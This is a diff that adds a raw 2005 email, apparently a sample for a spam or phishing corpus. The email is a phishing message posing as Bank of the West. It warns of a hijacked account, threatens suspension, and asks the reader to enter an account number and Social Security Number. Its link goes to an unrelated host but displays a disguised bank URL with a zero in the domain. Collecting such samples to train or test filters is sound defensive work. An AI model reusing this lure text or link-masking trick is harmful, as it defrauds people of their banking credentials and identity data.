@@ -1,0 +1,99 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 53C982A88C
+	for <user@example.com>; Fri, 12 Aug 2005 00:29:16 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 4B80F621CAB; Fri, 12 Aug 2005 00:29:16 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 2AF1F621CA6
+	for <user@example.com>; Fri, 12 Aug 2005 00:29:16 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id AAA10054
+	for user@example.com; Fri, 12 Aug 2005 00:29:15 -0400
+Received: from pasmtp.tele.dk (pasmtp.tele.dk [193.162.159.95])
+	by mail.example.com with ESMTP id AAA10046
+	for <user@example.com>; Fri, 12 Aug 2005 00:29:15 -0400
+Received: from olsen-familien.dk (0xc3291b17.hrnxx9.adsl-dhcp.tele.dk [195.41.27.23])
+	by pasmtp.tele.dk (Postfix) with ESMTP id 247101EC312
+	for <user@example.com>; Fri, 12 Aug 2005 06:29:14 +0200 (CEST)
+Received: from /spool/local
+	by olsen-familien.dk with [XMail 1.20 LMAIL Server]
+	for <user@example.com> from <>;
+	Fri, 12 Aug 2005 02:14:52 +0200
+To: user@example.com
+From: customercare@bankofthewest.com
+Subject: BANK OF THE WEST NOTICE
+Reply-To: customercare@bankofthewest.com
+Content-type: text/html
+Date: Fri, 12 Aug 2005 02:14:52 +0200
+Message-Id: <20050812042914.247101EC312@pasmtp.tele.dk>
+Content-Length: 2666
+Lines: 60
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 79
+
+
+<html>
+
+
+<body>
+
+<p>
+<img border="0" src="http://www.cfdrodeo.com/images/sponsor_botw.gif" width="170" height="80"></p>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="65%" id="AutoNumber1">
+  <tr>
+    <td width="100%">Dear Bank of the West customer,<p>We recently noticed one or more attempts to log in your
+    Bank of the West account from
+a foreign IP address and we have reasons to believe that your account was
+hijacked by a third party without your authorization.</p>
+<p>If you recently accessed your account while traveling, the unusual log in
+attempts may have initiated by you.<br>
+<br>
+However if you are the rightful holder of the account, click on the link below
+and submit, as we try to verify your account. (In case your are not enrolled for Online Banking use one of Checking or Savings account number as <b>User Name</b> and&nbsp; Social
+Security Number as <b>Password</b>):<br>
+<br>
+
+
+<a 
+href="http://80-219-219-193.dclient.hispeed.ch/.../SITE/CheckSession.php?MSG[ID]=a43e9d60e617e9c2652c5d779722cde8">https://www.bankofthewest.c<font face="Verdana" size="1">0</font>m/BOW/main.jsp?affiliate=9d1825494ae10</a></p>
+
+<p>The log in attempt was made from:</p>
+<p>IP address: <b>110.6.13.227</b><br>
+ISP host: <b>110.6.13.1.fastweb.rnet.org</b><br>
+<br>
+If you choose to ignore our request, you leave us no choice but to temporally
+suspend your account.</p>
+<p>We ask that you allow at least 48hrs for the case to be investigated and we
+strongly recommend not making any changes to your account in that time.</p>
+<p>If you received this notice and you are not the authorized account holder,
+please be aware that is in violation of Bank of the West policy to represent oneself as
+another Bank of the West account owner.Such action may also be in violation of local,
+national, and/or international law. Bank of the West is committed to assist law
+enforcement with any inquires related to attempts to misappropriate personal
+information with the Internet to commit fraud or theft.<br>
+Information will be provided at the request of law enforcement agencies to
+ensure that perpetrators are prosecuted to the fullest extent of the law.</p>
+<p>* <font color="#808080">Please do not respond to this email as your reply
+will not be received.</font><br>
+<br>
+For assistance, log in to your Bank of the West account and choose the &quot;<b>HELP</b>&quot;
+link.&nbsp; </p>
+<p>Thanks for your patience as we work together to protect your account.</p>
+<p>Regards,</p>
+<p>The Bank of the West Corp. Copyright © 2005. All rights reserved.</p>
+
+    <p>&nbsp;</td>
+  </tr>
+</table>
+
+</body>
+</html>
+
+
+
+
